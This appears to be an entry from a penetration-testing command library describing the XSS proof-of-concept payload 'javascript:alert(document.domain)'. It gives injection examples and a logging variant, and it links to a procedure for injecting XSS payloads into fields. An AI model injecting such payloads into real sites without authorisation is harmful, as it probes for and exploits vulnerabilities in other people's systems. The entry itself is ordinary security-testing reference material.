---
data: 'javascript:alert(document.domain)'
tags:
  - xss
  - payload
type: command
output: 'Browser alert box showing the domain (e.g., localhost)'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.259Z'
id: 0b73a4f5-8548-44c3-9cd6-4ab128dbe062
verified: false
validated: true
submitted: true
---
# javascript-alert-document-domain

## Command

```javascript
javascript:alert(document.domain)
```

## Description

This JavaScript payload uses the javascript: pseudoprotocol to execute an alert displaying the current document domain when triggered in a browser context, useful for demonstrating stored XSS execution and origin confirmation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| document.domain | Retrieves the domain of the current page | Yes |

## Examples

### Basic Usage

Inject into a URL or field:

```javascript
javascript:alert(document.domain)
```

### Advanced Usage

Combine with other actions:

```javascript
javascript:alert(document.domain); console.log('XSS triggered');
```

## Expected Output

A browser alert dialog appears with the text of the current domain, such as 'localhost', confirming script execution in the target's session.

## Related

- [[commands/javascript-alert-document-domain-semicolon]]
- [[procedures/Inject-XSS-Payloads-into-Domain-Fields]]
